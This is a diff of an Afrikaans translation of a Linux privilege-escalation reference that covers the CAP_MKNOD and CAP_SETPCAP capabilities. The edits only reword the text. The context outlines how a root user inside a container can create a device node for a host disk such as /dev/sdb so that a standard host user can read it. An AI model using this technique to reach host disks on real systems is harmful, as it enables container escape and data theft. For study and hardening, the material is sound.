 
 ## CAP_MKNOD
 
-[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) brei die funksionaliteit van die `mknod` stelselskakel uit, wat verder gaan as die skep van gewone lêers, FIFOs (genaamde pype), of UNIX-domein sokke. Dit stel spesifiek die skepping van spesiale lêers in staat, wat insluit:
+[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) brei die funksionaliteit van die `mknod` stelselskakel uit, bo en behalwe die skep van gewone lêers, FIFOs (genaamde pype), of UNIX-domein sokke. Dit stel spesifiek die skepping van spesiale lêers toe, wat insluit:
 
 - **S_IFCHR**: Karakter spesiale lêers, wat toestelle soos terminaal is.
 - **S_IFBLK**: Blok spesiale lêers, wat toestelle soos skywe is.
@@ -1479,7 +1476,7 @@ Hierdie vermoë maak dit moontlik om privaatheidsverhogings (deur volle skyflesi
 
 1. **Op die Gasheer as 'n Standaard Gebruiker:**
 
-- Bepaal jou huidige gebruikers-ID met `id`, byvoorbeeld, `uid=1000(standaardgebruiker)`.
+- Bepaal jou huidige gebruikers-ID met `id`, bv. `uid=1000(standaardgebruiker)`.
 - Identifiseer die teiken toestel, byvoorbeeld, `/dev/sdb`.
 
 2. **Binne die Houer as `root`:**
@@ -1506,17 +1503,17 @@ Hierdie benadering laat die standaard gebruiker toe om toegang te verkry en moon
 
 ### CAP_SETPCAP
 
-**CAP_SETPCAP** stel 'n proses in staat om **die vermoëns van 'n ander proses te verander**, wat die toevoeging of verwydering van vermoëns uit die effektiewe, erfbare en toegelate stelle moontlik maak. 'n Proses kan egter slegs vermoëns wat dit in sy eie toegelate stel het, wysig, wat verseker dat dit nie die voorregte van 'n ander proses bo sy eie kan verhoog nie. Onlangs het kernopdaterings hierdie reëls verskerp, wat `CAP_SETPCAP` beperk tot slegs die vermindering van die vermoëns binne sy eie of sy afstammelinge se toegelate stelle, met die doel om sekuriteitsrisiko's te verminder. Gebruik vereis dat `CAP_SETPCAP` in die effektiewe stel en die teikenvermoëns in die toegelate stel is, met `capset()` vir wysigings. Dit som die kernfunksie en beperkings van `CAP_SETPCAP` op, wat sy rol in voorregbestuur en sekuriteitsverbetering beklemtoon.
+**CAP_SETPCAP** stel 'n proses in staat om **die vermoënsstelle** van 'n ander proses te **verander**, wat die toevoeging of verwydering van vermoëns uit die effektiewe, erfbare en toegelate stelle moontlik maak. 'n Proses kan egter slegs vermoëns wat dit in sy eie toegelate stel het, verander, wat verseker dat dit nie die voorregte van 'n ander proses bo sy eie kan verhoog nie. Onlangs het kernopdaterings hierdie reëls verskerp, wat `CAP_SETPCAP` beperk tot slegs die vermindering van die vermoëns binne sy eie of sy afstammelinge se toegelate stelle, met die doel om sekuriteitsrisiko's te verminder. Gebruik vereis dat `CAP_SETPCAP` in die effektiewe stel en die teikenvermoëns in die toegelate stel is, met `capset()` vir wysigings. Dit som die kernfunksie en beperkings van `CAP_SETPCAP` op, wat sy rol in voorregbestuur en sekuriteitsverbetering beklemtoon.
 
-**`CAP_SETPCAP`** is 'n Linux vermoë wat 'n proses toelaat om **die vermoëns van 'n ander proses te wysig**. Dit bied die vermoë om vermoëns uit die effektiewe, erfbare en toegelate vermoëns van ander prosesse toe te voeg of te verwyder. Daar is egter sekere beperkings op hoe hierdie vermoë gebruik kan word.
+**`CAP_SETPCAP`** is 'n Linux vermoë wat 'n proses toelaat om **die vermoënsstelle van 'n ander proses te verander**. Dit bied die vermoë om vermoëns uit die effektiewe, erfbare en toegelate vermoënsstelle van ander prosesse by te voeg of te verwyder. Daar is egter sekere beperkings op hoe hierdie vermoë gebruik kan word.
 
-'n Proses met `CAP_SETPCAP` **kan slegs vermoëns toeken of verwyder wat in sy eie toegelate vermoëns stel is**. Met ander woorde, 'n proses kan nie 'n vermoë aan 'n ander proses toeken as dit nie daardie vermoë self het nie. Hierdie beperking verhoed dat 'n proses die voorregte van 'n ander proses bo sy eie vlak van voorreg verhoog.
+'n Proses met `CAP_SETPCAP` **kan slegs vermoëns toeken of verwyder wat in sy eie toegelate vermoënsstel is**. Met ander woorde, 'n proses kan nie 'n vermoë aan 'n ander proses toeken as dit nie daardie vermoë self het nie. Hierdie beperking verhoed dat 'n proses die voorregte van 'n ander proses bo sy eie vlak van voorreg verhoog.
 
-Boonop is die `CAP_SETPCAP` vermoë in onlangse kernweergawe **verder beperk**. Dit laat nie meer 'n proses toe om arbitrêr die vermoëns van ander prosesse te wysig nie. In plaas daarvan **laat dit slegs 'n proses toe om die vermoëns in sy eie toegelate vermoëns stel of die toegelate vermoëns stel van sy afstammelinge te verlaag**. Hierdie verandering is bekendgestel om potensiële sekuriteitsrisiko's wat met die vermoë verband hou, te verminder.
+Boonop is die `CAP_SETPCAP` vermoë in onlangse kernweergawe **verder beperk**. Dit laat nie meer 'n proses toe om arbitrêr die vermoënsstelle van ander prosesse te verander nie. In plaas daarvan **laat dit slegs 'n proses toe om die vermoëns in sy eie toegelate vermoënsstel of die toegelate vermoënsstel van sy afstammelinge te verlaag**. Hierdie verandering is ingestel om potensiële sekuriteitsrisiko's wat met die vermoë verband hou, te verminder.
 
-Om `CAP_SETPCAP` effektief te gebruik, moet jy die vermoë in jou effektiewe vermoëns stel en die teikenvermoëns in jou toegelate vermoëns stel hê. Jy kan dan die `capset()` stelselskakel gebruik om die vermoëns van ander prosesse te wysig.
+Om `CAP_SETPCAP` effektief te gebruik, moet jy die vermoë in jou effektiewe vermoënsstel hê en die teikenvermoëns in jou toegelate vermoënsstel. Jy kan dan die `capset()` stelselskakel gebruik om die vermoënsstelle van ander prosesse te verander.
 
-In samevatting, `CAP_SETPCAP` laat 'n proses toe om die vermoëns van ander prosesse te wysig, maar dit kan nie vermoëns toeken wat dit nie self het nie. Boonop, as gevolg van sekuriteitskwessies, is die funksionaliteit in onlangse kernweergawe beperk om slegs die vermoëns in sy eie toegelate vermoëns stel of die toegelate vermoëns van sy afstammelinge te verminder.
+In samevatting, `CAP_SETPCAP` laat 'n proses toe om die vermoënsstelle van ander prosesse te verander, maar dit kan nie vermoëns toeken wat dit nie self het nie. Boonop, as gevolg van sekuriteitskwessies, is die funksionaliteit in onlangse kernweergawe beperk om slegs die vermindering van vermoëns in sy eie toegelate vermoënsstel of die toegelate vermoënsstelle van sy afstammelinge toe te laat.
 
 ## Verwysings
 
